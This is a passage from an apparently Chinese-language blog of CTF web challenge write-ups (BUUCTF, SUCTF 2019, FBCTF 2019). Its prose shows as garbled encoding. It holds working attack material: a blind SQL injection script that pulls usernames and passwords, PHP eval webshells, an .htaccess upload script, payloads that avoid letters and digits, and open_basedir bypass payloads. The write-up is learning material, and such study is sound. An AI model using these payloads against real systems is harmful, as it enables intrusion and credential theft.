        <span class="token comment">#é…Œæƒ…åˆ é™¤ï¼Œæ¯•ç«Ÿä¸€èˆ¬åº“è¡¨åˆ—é‡Œéƒ½æ²¡æœ‰ç©ºæ ¼</span>
        <span class="token keyword">if</span> tmp <span class="token operator">==</span> <span class="token number">32</span><span class="token punctuation">:</span>
            <span class="token keyword">break</span>
        rlt<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>rlt<span class="token punctuation">)</span>
    <span class="token keyword">return</span> rlt<span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token punctuation">)</span>
url <span class="token operator">=</span><span class="token string">'http://87942c48-9ef1-4f40-97af-3058097ac1dd.node3.buuoj.cn/image.php?id=\\0&amp;path=or%20ord(substr(database(),&#123;&#125;,1))>&#123;&#125;%23'</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'æ•°æ®åº“åä¸ºï¼š'</span><span class="token punctuation">,</span>exp<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>
url <span class="token operator">=</span><span class="token string">'http://87942c48-9ef1-4f40-97af-3058097ac1dd.node3.buuoj.cn/image.php?id=\\0&amp;path=or%20ord(substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=0x636973636e66696e616c),&#123;&#125;,1))>&#123;&#125;%23'</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'è¡¨åä¸ºï¼š'</span><span class="token punctuation">,</span>exp<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>
url <span class="token operator">=</span><span class="token string">'http://87942c48-9ef1-4f40-97af-3058097ac1dd.node3.buuoj.cn/image.php?id=\\0&amp;path=or%20ord(substr((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=0x636973636e66696e616c and table_name=0x7573657273),&#123;&#125;,1))>&#123;&#125;%23'</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'åˆ—åä¸ºï¼š'</span><span class="token punctuation">,</span>exp<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>
url <span class="token operator">=</span><span class="token string">'http://87942c48-9ef1-4f40-97af-3058097ac1dd.node3.buuoj.cn/image.php?id=\\0&amp;path=or%20ord(substr((select%20group_concat(username)%20from%20users),&#123;&#125;,1))>&#123;&#125;%23'</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ç”¨æˆ·åä¸ºï¼š'</span><span class="token punctuation">,</span>exp<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>
url <span class="token operator">=</span><span class="token string">'http://87942c48-9ef1-4f40-97af-3058097ac1dd.node3.buuoj.cn/image.php?id=\\0&amp;path=or%20ord(substr((select%20group_concat(password)%20from%20users),&#123;&#125;,1))>&#123;&#125;%23'</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'å¯†ç ä¸ºï¼š'</span><span class="token punctuation">,</span>exp<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#urlè¦å¡«å…¥è‡ªå·±çš„</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è·‘å®Œåæœ‰è´¦å·å¯†ç ï¼Œç™»å½•åæœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ </p>
<p>ä¼šå°†æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶åå†™å…¥logæ–‡ä»¶ï¼Œæƒ³åˆ°å¯ä»¥å†™æœ¨é©¬è¿›å»ï¼Œä½†æ˜¯phpè¢«è¿‡æ»¤ï¼Œç”¨&#x3D;ä»£æ›¿</p>
<p><code>&lt;?= @eval($_POST[&#39;cmd&#39;]);?&gt;</code>		è¦åœ¨æŠ“åŒ…çš„æ—¶å€™æ”¹åå­—</p>
<p>ç„¶åè®¿é—®æ–‡ä»¶ï¼Œè¿æ¥èšå‰‘ã€‚</p>
<hr>
<h4 id="çº¢æ˜è°·CTF-2021-write-shell"><a href="#çº¢æ˜è°·CTF-2021-write-shell" class="headerlink" title="[çº¢æ˜è°·CTF 2021]write_shell"></a>[çº¢æ˜è°·CTF 2021]write_shell</h4><p>è¿™é¢˜ä¸»è¦æœ‰ä¸¤ä¸ªçŸ¥è¯†ç‚¹<br>1.phpçŸ­æ ‡ç­¾<br>2.phpå¯åœ¨&#96;&#96;ä¸­æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p>
<p><code>&lt;?= ?&gt;</code>ç›¸å½“äº<code>&lt;?echo ?&gt;</code>,ç©ºæ ¼æ¯è¿‡æ»¤äº†ç”¨%09ä»£æ›¿</p>
<p>PHP æ”¯æŒä¸€ä¸ªæ‰§è¡Œè¿ç®—ç¬¦ï¼šåå¼•å·ï¼ˆ``ï¼‰ã€‚æ³¨æ„è¿™ä¸æ˜¯å•å¼•å·ï¼PHP å°†å°è¯•å°†åå¼•å·ä¸­çš„å†…å®¹ä½œä¸º shell å‘½ä»¤æ¥æ‰§è¡Œï¼Œå¹¶å°†å…¶è¾“å‡ºä¿¡æ¯è¿”å›ï¼ˆå³ï¼Œå¯ä»¥èµ‹ç»™ä¸€ä¸ªå˜é‡è€Œä¸æ˜¯ç®€å•åœ°ä¸¢å¼ƒåˆ°æ ‡å‡†è¾“å‡ºï¼‰ã€‚ä½¿ç”¨åå¼•å·è¿ç®—ç¬¦â€&#96;â€çš„æ•ˆæœä¸å‡½æ•°shell_exec() ç›¸åŒã€‚</p>
<p>paylaod:</p>
<pre class="line-numbers language-none"><code class="language-none">?data&#x3D;&lt;?echo%09&#96;cat%09&#x2F;flllllll1112222222lag&#96;?&gt;&amp;action&#x3D;upload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h4 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h4><p>ç›´æ¥ç»™äº†æºä»£ç ï¼Œæœ‰ä¸€ä¸ª<code>get_the_flag</code>å‡½æ•°å’Œgetä¼ å‚<code>_</code> ï¼Œæœ€åä¼šæ‰§è¡Œ<code>eval(_)</code></p>
<p>æ€è·¯ï¼šgetä¼ å‚åˆ©ç”¨get_the_flagå‡½æ•°ä¸Šä¼ æœ¨é©¬æ–‡ä»¶</p>
<p>&#x3D;&#x3D;æ— æ•°å­—å­—æ¯getshell&#x3D;&#x3D;</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span><span class="token punctuation">,</span> <span class="token variable">$hhh</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å¿…é¡»è¦ç»•è¿‡è¿™ä¸ªæ­£åˆ™åŒ¹é…</p>
<p>payload:</p>
<pre class="line-numbers language-none"><code class="language-none">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;get_the_flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>&#x3D;&#x3D;.htaccessæ–‡ä»¶ä¸Šä¼ &#x3D;&#x3D;</p>
<p>åˆ©ç”¨pythonè„šæœ¬ä¸Šä¼ æ–‡ä»¶</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span>  requests
<span class="token keyword">import</span> base64

url <span class="token operator">=</span> <span class="token string">'http://b2e4412f-0209-4b01-b734-0d94367d7f84.node4.buuoj.cn:81/?_=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag'</span>
htaccess<span class="token operator">=</span><span class="token triple-quoted-string string">'''#define width 1337
#define height 1337

AddType application/x-httpd-php .ha
php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_cc551ab005b2e60fbdc88de809b2c4b1/shell.ha"'''</span>

files <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token string">'file'</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'.htaccess'</span><span class="token punctuation">,</span>htaccess<span class="token punctuation">,</span><span class="token string">'image/jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>files<span class="token operator">=</span>files<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>

shell <span class="token operator">=</span> <span class="token string">b"GIF89a12"</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">b"&lt;?php eval($_POST['shell']);?>"</span><span class="token punctuation">)</span>  <span class="token comment">#GIF89a12é‡Œçš„12æ˜¯ä¸ºäº†ç¬¦åˆbase64è§£ç è§„èŒƒè€Œæ·»åŠ çš„</span>

files2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token string">'file'</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'shell.ha'</span><span class="token punctuation">,</span>shell<span class="token punctuation">,</span><span class="token string">'image/jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>files<span class="token operator">=</span>files2<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¾—åˆ°è·¯å¾„<code>upload/tmp_cc551ab005b2e60fbdc88de809b2c4b1/shell.ha</code></p>
<p>è®¿é—®ç„¶åèšå‰‘è¿æ¥</p>
<p>&#x3D;&#x3D;open_basedirç»•è¿‡&#x3D;&#x3D;</p>
<blockquote>
<p>è¿™é‡Œå¯ä»¥ä½¿ç”¨èšå‰‘è‡ªå¸¦çš„æ’ä»¶ç›´æ¥æ‹¿flag(éé¢„æœŸ)</p>
</blockquote>
<p>ç»•è¿‡æ–¹æ³•å¤§è‡´å¦‚ä¸‹ï¼ˆphp5æœ‰å…¶å®ƒæ–¹æ³•ï¼‰ï¼š</p>
<ul>
<li><p>é¦–å…ˆæ„é€ ä¸€ä¸ªç›¸å¯¹å¯ä»¥ä¸Šè·³çš„open_basedir å…¥<code>mkdir(&#39;mayi&#39;); chdir(&#39;mayi&#39;)</code> å½“ç„¶æˆ‘ä»¬è¿™é‡Œæœ‰ä¸Šè·³çš„è·¯å¾„æˆ‘ä»¬ç›´æ¥ <code>chdir(&quot;img&quot;)</code></p>
</li>
<li><p>ç„¶åæ¯æ¬¡æ“ä½œ<code>chdir(&quot;..&quot;)</code>éƒ½ä¼šè¿›ä¸€æ¬¡open_basedirçš„æ¯”å¯¹ç”±äºç›¸å¯¹è·¯å¾„çš„é—®é¢˜ï¼Œæ¯æ¬¡open_basedirçš„è¡¥å…¨éƒ½ä¼šä¸Šè·³ã€‚</p>
</li>
<li><p>æ¯”å¦‚åˆè¯•open_basedirä¸º&#x2F;a&#x2F;b&#x2F;c&#x2F;dï¼š</p>
</li>
<li><p>ç¬¬ä¸€æ¬¡chdiråå˜ä¸º&#x2F;a&#x2F;b&#x2F;cï¼Œç¬¬äºŒæ¬¡chdiråå˜ä¸º&#x2F;a&#x2F;bï¼Œç¬¬ä¸‰æ¬¡chdiråå˜ä¸º&#x2F;aã€€ç¬¬å››æ¬¡chdiråå˜ä¸º&#x2F;</p>
</li>
<li><p>é‚£ä¹ˆè¿™æ—¶å€™å†è¿›è¡Œini_setï¼Œè°ƒæ•´open_basedirä¸º&#x2F;å³å¯é€šè¿‡php_check_open_basedir_exçš„æ ¡éªŒï¼ŒæˆåŠŸè¦†ç›–ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥bypass open_basedirã€‚</p>
<p>payload</p>
<pre class="line-numbers language-none"><code class="language-none">payload1:shell&#x3D;chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(scandir(&#39;&#x2F;&#39;));

payload2:shell&#x3D;chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print(readfile(&#39;&#x2F;THis_Is_tHe_F14g&#39;));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
</ul>
<hr>
<h4 id="æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME</h4><p>&#x3D;&#x3D;æ— æ•°å­—å­—æ¯rce&#x3D;&#x3D;</p>
<p>payload:</p>
<pre class="line-numbers language-none"><code class="language-none">?code&#x3D;$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç„¶åå°±æ˜¾ç¤ºäº†phpinfo</p>
<p>å°è¯•äº†system()å‡½æ•°ï¼Œæ— æœã€‚åº”è¯¥æ˜¯æœ‰é™åˆ¶çš„ã€‚</p>
<p>å¯ä»¥åˆ©ç”¨<code>assert(eval($_POST[cmd]))</code>å†™ğŸ</p>
<p>ç›´æ¥å–å</p>
<p>payload:</p>
<pre class="line-numbers language-none"><code class="language-none">?code&#x3D;$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6);&amp;%ff&#x3D;assert<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>postä¼ å‚<code>cmd=phpinfo();</code>æˆåŠŸäº†</p>
<p>èšå‰‘è¿æ¥ï¼Œä½†æ˜¯æ— æ³•è¯»å–æ–‡ä»¶ï¼Œç›´æ¥ä½¿ç”¨èšå‰‘çš„disable_functionæ’ä»¶ç»•è¿‡<code>open_basedir</code>é™åˆ¶ã€‚</p>
<p>åœ¨å‘½ä»¤è¡Œæ‰§è¡Œ<code>/readflag</code> æ‹¿åˆ°flag</p>
<hr>
<h4 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h4><p>æç¤ºå‘é€jsonæ•°æ®</p>
<p><code>&#123;&quot;cmd&quot;:&quot;ls&quot;&#125;</code></p>
<p>å›æ˜¾index.php</p>
<ol>
<li>ä»£ç ä¸­ä½¿ç”¨<code>putenv(&#39;PATH=/home/rceservice/jail&#39;);</code> é…ç½®ç³»ç»Ÿç¯å¢ƒå˜é‡ï¼Œè€Œæˆ‘ä»¬ç”¨ä¸äº† cat ä¹Ÿæœ‰å¯èƒ½æ˜¯åœ¨è¿™ä¸ªç¯å¢ƒå˜é‡ä¸‹æ²¡æœ‰è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ã€‚æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨<code>/bin/cat</code> æ¥è°ƒç”¨catå‘½ä»¤ã€‚</li>
<li>Linuxå‘½ä»¤çš„ä½ç½®ï¼š&#x2F;bin,&#x2F;usr&#x2F;binï¼Œé»˜è®¤éƒ½æ˜¯å…¨ä½“ç”¨æˆ·ä½¿ç”¨ï¼Œ&#x2F;sbin,&#x2F;usr&#x2F;sbin,é»˜è®¤rootç”¨æˆ·ä½¿ç”¨</li>
</ol>
<p>&#x3D;&#x3D;%0aç»•è¿‡æ­£åˆ™&#x3D;&#x3D;</p>
<p>payload:</p>
<p>&#96;?cmd&#x3D;</p>

  <p><a class="classtest-link" href="/tags/CTF/" rel="tag">CTF</a> â€” 2022å¹´3æœˆ23æ—¥</p>
  


        </div>
        <div class="row mt-2">
  <h3>Search</h3>
  <div><input id="search-text" title="search" class="search-text" type="text" placeholder="search......"></div>
  <div style="margin-top: 1.5rem;">
    <ul id="result"></ul>
  </div>
</div>
        <div class="row mt-2">
  
    <div class="eight columns">
      <p id="madewith">Made with â¤ and
        <a class="footer-link icon" href="https://hexo.io" target="_blank" style="text-decoration: none;" rel="noreferrer" aria-label="Hexo.io">
        <svg class="hexo svg-hov" width="14" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><title>Hexo.js</title><path d="M12 .007L1.57 6.056V18.05L12 23.995l10.43-6.049V5.952L12 .007zm4.798 17.105l-.939.521-.939-.521V12.94H9.08v4.172l-.94.521-.938-.521V6.89l.939-.521.939.521v4.172h5.84V6.89l.94-.521.938.521v10.222z"/></svg>
        </a>
        
    </div>

    <!-- Sepcial thanks to https://simpleicons.org/ for the icons -->
    <div class="four columns mb-3 posisi" >
      
      <a class="ml-0 footer-link icon" href="https://github.com/" target="_blank" style="text-decoration: none" rel="noreferrer" aria-label="GitHub">
        <svg class="github svg-hov" width="18" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
      </a>
      

      

      
      <a class="ml-0 footer-link icon" href="https://twitter.com/" target="_blank" style="text-decoration: none" rel="noreferrer" aria-label="Twitter">
        <svg class="twitter svg-hov" width="18" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Twitter</title><path d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z"/></svg>
      </a>
      

      
      <a class="ml-0 footer-link icon" href="https://instagram.com/" target="_blank" style="text-decoration: none" rel="noreferrer" aria-label="Instagram">
        <svg class="instagram svg-hov" width="18" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Instagram</title><path d="M12 0C8.74 0 8.333.015 7.053.072 5.775.132 4.905.333 4.14.63c-.789.306-1.459.717-2.126 1.384S.935 3.35.63 4.14C.333 4.905.131 5.775.072 7.053.012 8.333 0 8.74 0 12s.015 3.667.072 4.947c.06 1.277.261 2.148.558 2.913.306.788.717 1.459 1.384 2.126.667.666 1.336 1.079 2.126 1.384.766.296 1.636.499 2.913.558C8.333 23.988 8.74 24 12 24s3.667-.015 4.947-.072c1.277-.06 2.148-.262 2.913-.558.788-.306 1.459-.718 2.126-1.384.666-.667 1.079-1.335 1.384-2.126.296-.765.499-1.636.558-2.913.06-1.28.072-1.687.072-4.947s-.015-3.667-.072-4.947c-.06-1.277-.262-2.149-.558-2.913-.306-.789-.718-1.459-1.384-2.126C21.319 1.347 20.651.935 19.86.63c-.765-.297-1.636-.499-2.913-.558C15.667.012 15.26 0 12 0zm0 2.16c3.203 0 3.585.016 4.85.071 1.17.055 1.805.249 2.227.415.562.217.96.477 1.382.896.419.42.679.819.896 1.381.164.422.36 1.057.413 2.227.057 1.266.07 1.646.07 4.85s-.015 3.585-.074 4.85c-.061 1.17-.256 1.805-.421 2.227-.224.562-.479.96-.899 1.382-.419.419-.824.679-1.38.896-.42.164-1.065.36-2.235.413-1.274.057-1.649.07-4.859.07-3.211 0-3.586-.015-4.859-.074-1.171-.061-1.816-.256-2.236-.421-.569-.224-.96-.479-1.379-.899-.421-.419-.69-.824-.9-1.38-.165-.42-.359-1.065-.42-2.235-.045-1.26-.061-1.649-.061-4.844 0-3.196.016-3.586.061-4.861.061-1.17.255-1.814.42-2.234.21-.57.479-.96.9-1.381.419-.419.81-.689 1.379-.898.42-.166 1.051-.361 2.221-.421 1.275-.045 1.65-.06 4.859-.06l.045.03zm0 3.678c-3.405 0-6.162 2.76-6.162 6.162 0 3.405 2.76 6.162 6.162 6.162 3.405 0 6.162-2.76 6.162-6.162 0-3.405-2.76-6.162-6.162-6.162zM12 16c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4zm7.846-10.405c0 .795-.646 1.44-1.44 1.44-.795 0-1.44-.646-1.44-1.44 0-.794.646-1.439 1.44-1.439.793-.001 1.44.645 1.44 1.439z"/></svg>
      </a>
      

      

    </div>
  
</div>
<script src="/js/prism/prism.js" async></script>
      </div>

    </div>

  </div>
  <script src="/js/nanobar.min.js"></script>

  <script>
    var options = {
      classname: 'nanobar',
      id: 'myNanobar'
    };
    var nanobar = new Nanobar(options);
    nanobar.go(30);
    nanobar.go(76);
    nanobar.go(100);
  </script>

</body>

</html>